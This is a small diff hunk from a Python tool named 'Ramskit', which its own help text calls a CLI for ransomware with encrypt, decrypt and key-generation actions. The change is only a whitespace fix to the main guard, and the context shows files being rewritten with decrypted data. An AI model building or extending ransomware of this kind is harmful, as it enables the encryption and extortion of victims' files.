@@ -40,7 +40,7 @@ class Ramskit:
             with open(item, 'wb') as f:
                 f.write(decrypted)       
 
-if __name__ =='__main__':
+if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True, help='Action to perform [encrypt/decrypt/generate_key]')
     parser.add_argument('-k', '--key', dest="key", required=True, help='Key file')
